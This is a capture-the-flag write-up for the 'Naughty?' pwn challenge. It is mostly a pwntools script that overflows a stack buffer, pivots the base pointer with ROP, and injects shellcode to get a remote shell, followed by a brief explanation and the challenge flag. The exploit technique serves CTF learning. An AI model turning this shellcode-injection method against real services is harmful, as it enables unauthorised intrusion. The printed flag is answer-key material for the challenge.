# Naughty? [50]
You haven't been naughty, have you?

**Target**: nc challs.xmas.htsp.ro 2000

**Author**: Th3R4nd0m

**Files**:naughty.zip

## Solving
I am 99% sure my solve method is miles away from the intended method, so I'm just going to dump the solve script here:
```python
from pwnscripts import *
context.binary = 'chall'

scratch = context.binary.got['puts']+0x500
r = remote('challs.xmas.htsp.ro', 2000)
R = ROP(context.binary)
R.raw(b'a'*46)
R.raw(p16(0xe4ff))
R.raw(scratch)
R.raw(0x40068D)
context.log_level = 'debug'
r.sendlineafter('\n', R.chain())

R = ROP(context.binary)
R.raw(sh().ljust(46))   # https://github.com/152334H/pwnscripts. If not, shellcraft.sh() will also work here
R.raw(p16(0xe4ff))
R.raw(scratch-0x30)
R.raw(scratch-0x30)
r.sendlineafter('\n', R.chain())

r.interactive()
```
Basically, 
1. in the first payload, set the saved rbp to `scratch`, and return to the middle of main at the fgets() call.
2. fgets() will write to [rbp-0x20]. Dump shellcode in there, and then return to it. The saved bp is also set to there so that the shellcode works.
## Flag
`X-MAS{sant4_w1ll_f0rg1ve_y0u_th1s_y3ar}`
